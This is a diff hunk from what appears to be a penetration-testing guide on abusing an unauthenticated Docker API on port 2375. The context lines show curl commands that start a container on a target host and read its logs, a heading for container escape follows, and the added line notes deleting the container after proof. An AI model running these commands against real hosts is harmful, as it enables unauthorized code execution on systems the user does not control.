@@ -22,6 +22,7 @@ curl -X POST http://<target>:2375/containers/create \
 # Then start and read logs
 curl -X POST http://<target>:2375/containers/<id>/start
 curl http://<target>:2375/containers/<id>/logs?stdout=true
+# Remove the container after proof: DELETE http://<target>:2375/containers/<id>?force=true
 ```
 
 ## Container Escape
